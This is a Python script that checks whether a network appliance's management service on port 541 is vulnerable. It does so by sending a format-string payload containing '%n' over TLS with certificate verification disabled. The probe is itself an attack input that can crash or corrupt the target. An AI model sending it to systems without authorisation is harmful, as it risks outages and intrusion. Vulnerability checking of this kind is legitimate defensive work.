import socket
import ssl
import struct
import sys


def check_vulnerability(hostname):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(5)
        try:
            sock.connect((hostname, 541))
        except socket.error as e:
            print(f"[-] Could not connect to {hostname}: {e}")
            return False

        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            try:
                pkt_flags = struct.unpack('i', ssock.recv(4))[0]
                pkt_len = struct.unpack('i', ssock.recv(4))[0] - 2
                payload = ssock.recv(pkt_len - 8)

                format_string_payload = b"reply 200\r\nrequest=auth\r\nauthip=%n\r\n\r\n\x00"
                packet = b''
                packet += 0x0001e034.to_bytes(4, 'little')
                packet += (len(format_string_payload) + 8).to_bytes(4, 'big')
                packet += format_string_payload

                ssock.send(packet)

                response = ssock.recv(1024)
                print("[+] Device is likely not vulnerable - received response.")
                return False
            except ssl.SSLError as ssl_err:
                if "tlsv1 alert" in str(ssl_err).lower():
                    print(f"[+] Device {hostname} is vulnerable. Connection aborted as expected.")
                    return True
                else:
                    print(f"[-] Unexpected SSL error: {ssl_err}")
                    return False
            except socket.error as sock_err:
                print(f"[-] Socket error: {sock_err}")
                return False


def main():
    while True:
        hostname = input("Enter the hostname to check (or 'exit' to quit): ")
        if hostname.lower() == 'exit':
            break

        is_vulnerable = check_vulnerability(hostname)
        if is_vulnerable:
            print(f"[!] Warning: {hostname} is vulnerable!")
        else:
            print(f"[+] {hostname} appears to be patched.")


if __name__ == "__main__":
    main()
